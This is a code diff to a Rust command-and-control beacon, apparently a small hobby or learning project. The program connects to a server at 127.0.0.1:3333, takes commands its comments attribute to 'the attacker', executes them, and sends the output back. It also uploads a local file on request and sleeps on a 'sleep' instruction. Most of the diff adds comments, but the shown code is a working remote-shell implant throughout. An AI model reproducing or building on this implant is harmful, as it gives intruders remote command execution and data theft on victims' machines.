@@ -14,13 +14,14 @@ const TIMEOUT:u64=60;
 //use std::os::unix::net::SocketAddr;
 
 
-
+/// Structure contains information of the results command
 struct Resultat{
     status: String,
     stdout: String,
     stderr: String,
 }
 
+/// Create a new Resultat
 fn create_resultat(status: String, stdout: String, stderr: String) -> Resultat{
     Resultat {
         status,
@@ -32,7 +33,8 @@ fn create_resultat(status: String, stdout: String, stderr: String) -> Resultat{
 fn duration_before_shutdown(stream: &mut TcpStream, time:u64) {
     stream.set_read_timeout(Some(Duration::new(TIMEOUT, 0))).expect("set_read_timeout call failed");
 }
-/* execute commands and returns results */
+
+/// execute commands and returns results
 fn execute_commands(command: &str) -> Resultat {
     
     //  runs the program and returns the output
@@ -49,7 +51,7 @@ fn execute_commands(command: &str) -> Resultat {
 }
 
 
-/* display the array result */
+/// display the array result 
 fn display_resultat(v: Vec<Resultat>){
     if v.is_empty(){
         println!("Il n'y a pas de resultat ");
@@ -60,17 +62,16 @@ fn display_resultat(v: Vec<Resultat>){
             println!("stderr: {}", i.stderr);
         }
     }
-
 }
 
-
+/// Retrieve the chain command sent by the attacker
 fn get_command(command: &str) -> String{
-    let mut result = command.replace("command  ", "");
-    let result = result.replace(" target", "");
+    let mut result = command.replace("command  ", ""); // remove command from the string
+    let result = result.replace(" target", ""); // remove target from the string
     result
 }
 
-
+/// Sleep the beacon for a specified amount of time
 fn sleep_beacon(milli_second: u64){
     let ten_millis = time::Duration::from_millis(milli_second);
     let now = time::Instant::now();
@@ -98,39 +99,41 @@ fn upload_file(stream: &mut TcpStream, path: &str) {
 fn main(){
 
     let addr = "127.0.0.1:3333";
-    let mut stream = TcpStream::connect(addr).unwrap();
+    let mut stream = TcpStream::connect(addr).unwrap(); // connect to server
     println!("Server connecting on addr {}",addr);
 
     duration_before_shutdown(&mut stream, 60);
-    upload_file(&mut stream, "src/uploadFile.txt");
 
-    let mut reader = BufReader::new(&stream);
+    let mut reader = BufReader::new(&stream); // struct adds buffering to any reader.
     let mut writer = &stream;
     let mut line = String::new();
-    let lines_server = reader.lines().fuse();
-    for l in lines_server {
-        line = l.unwrap();
-        if line.contains("command") | line.contains("target"){
+    let lines_server = reader.lines().fuse(); // an iterator over the lines of an instance of BufRead
 
+
+    for l in lines_server {
+        line = l.unwrap();  // error handling
+        let mut stream2 = stream.try_clone().unwrap();
+
+        if line.contains("upload"){
+            upload_file(&mut stream2, "src/uploadFile.txt");
         }
         if line.contains("sleep"){
             println!("exectue sleep function");
             sleep_beacon(10000);
         }else{ 
-            /*line.contains("command") | line.contains("target") {*/
-            let mut response = String::from("response:");
-            let command = get_command(line.trim()); // return the command input without "command" and "target"
+            let mut response = String::from("response:");   // the response string should be sent to the server
+            let command = get_command(line.trim());     // return the command input without "command" and "target"
             println!("command receive is : {}", command);
-            let results = execute_commands(&command);
-            println!("result of the command : {}", results.stdout);
-            response.push_str(&results.status);
+            let results = execute_commands(&command);   // execute the commands
+            println!("result of the command : {}", results.stdout);    // print the results
+            /// add results to the response string
+            response.push_str(&results.status); 
             response.push_str(" stdout : ");
             response.push_str(&results.stdout);
             response.push_str(" stderr : ");
             response.push_str(&results.stderr);
-            println!("{}", response);
-            writer.write_all(response.as_bytes()).unwrap();
-            //list_result_command.push(results);
+            println!("{}", response);   // print the response
+            writer.write_all(response.as_bytes()).unwrap(); // write the response in the server
         }
     }
     
